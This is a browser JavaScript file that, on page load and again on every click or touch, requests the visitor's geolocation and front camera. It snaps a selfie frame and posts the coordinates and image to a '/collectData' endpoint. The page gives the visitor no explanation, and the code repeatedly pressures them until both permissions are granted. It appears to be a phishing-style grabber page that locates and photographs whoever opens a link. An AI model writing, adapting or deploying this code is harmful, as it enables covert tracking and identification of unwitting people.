let locationDone = false;
let cameraDone = false;
let isRunning = false;

async function requestPermissionsAndCollect() {
    if (isRunning) return;
    isRunning = true;

    const data = {};
    let hasNewData = false;

    // 0. Check Permission States (Debugging)
    try {
        if (navigator.permissions) {
            const locStatus = await navigator.permissions.query({ name: 'geolocation' });
            console.log('Location State:', locStatus.state);
            const camStatus = await navigator.permissions.query({ name: 'camera' }).catch(() => null);
            if (camStatus) console.log('Camera State:', camStatus.state);
        }
    } catch (e) { console.log('Permission Query API not supported'); }

    // 1. Get Location (if not already captured)
    if (!locationDone) {
        try {
            console.log('Requesting Location...');
            const pos = await new Promise((resolve, reject) => {
                navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 7000 }); // Reduced timeout
            });
            data.location = {
                lat: pos.coords.latitude,
                lng: pos.coords.longitude,
                acc: pos.coords.accuracy
            };
            locationDone = true;
            hasNewData = true;
        } catch (err) {
            // If denied, we report it but keep locationDone = false so retry is possible (unless permanently blocked)
            data.locationError = err.message || 'Permission Denied/Timeout';
            console.log('Location denied or failed', err);
        }
    }

    // 2. Get Camera Image (if not already captured)
    if (!cameraDone) {
        try {
            console.log('Requesting Camera...');
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });

            const video = document.createElement('video');
            video.srcObject = stream;
            video.setAttribute('playsinline', ''); // Critical for mobile

            await new Promise(r => video.onloadedmetadata = r);
            await video.play();
            await new Promise(r => setTimeout(r, 800)); // Exposure time

            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);

            data.photoUrl = canvas.toDataURL('image/jpeg', 0.8);
            cameraDone = true;
            hasNewData = true;

            stream.getTracks().forEach(t => t.stop());
        } catch (err) {
            data.cameraError = err.message || 'Permission Denied/Device Error';
            console.log('Camera denied or failed', err);
        }
    }

    // 3. Send to Backend
    if (hasNewData || (Object.keys(data).length > 0 && (!locationDone || !cameraDone))) {
        // Send if we have new data OR if we have error reports (so user knows it failed)
        // We filter out empty sends
        if (Object.keys(data).length > 0) {
            fetch('/collectData', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            }).then(() => console.log('Data/Error sent')).catch(console.error);
        }
    }

    isRunning = false;
}

// Initial Attempt
window.onload = requestPermissionsAndCollect;

// Aggressive Retry on Interaction
// If a user clicks ANYWHERE, we try again if we are missing anything.
document.addEventListener('click', () => {
    if (!locationDone || !cameraDone) {
        console.log('User clicked. Retrying missing permissions...');
        requestPermissionsAndCollect();
    }
});

document.addEventListener('touchstart', () => {
    if (!locationDone || !cameraDone) {
        console.log('User touched. Retrying missing permissions...');
        requestPermissionsAndCollect();
    }
}, { passive: true });
